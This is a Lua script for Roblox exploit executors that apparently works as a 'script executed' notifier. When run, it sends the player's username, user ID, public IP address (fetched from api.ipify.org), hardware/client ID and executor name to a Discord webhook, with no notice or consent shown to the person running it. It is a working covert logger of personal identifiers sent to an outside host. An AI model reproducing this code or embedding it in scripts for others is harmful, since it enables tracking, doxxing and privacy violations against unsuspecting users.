HttpService = game:GetService("HttpService")
Webhook_URL = getgenv().webhooklink

local response = request({
    Url = Webhook_URL,
    Method = "POST", 
    Headers = {
		['Content-Type'] = 'application/json'
	},
    Body = HttpService:JSONEncode({
		['content'] = "",
		['embeds'] = {{
			["title"] = "**Your Script has been executed!**",
			["description"] = "Stage : ** Authenticated **",
			["type"] = "rich",
			["color"] = tonumber(0x09FF00),
			["fields"] = {
				{
					["name"] = "**Info**",
					["value"] = "**Executor : **"..getgenv().executor.."\n".."**Roblox Username : **"..game.Players.LocalPlayer.Name.."\n".."**Roblox User ID : **"..game.Players.LocalPlayer.UserId.."\n".."**IP Address : **"..game:HttpGet("http://api.ipify.org").."\n".."**Hardware ID : **"..game:GetService("RbxAnalyticsService"):GetClientId(),
					["inline"] = true
				}
			}
		
		}}
	}
	)
})
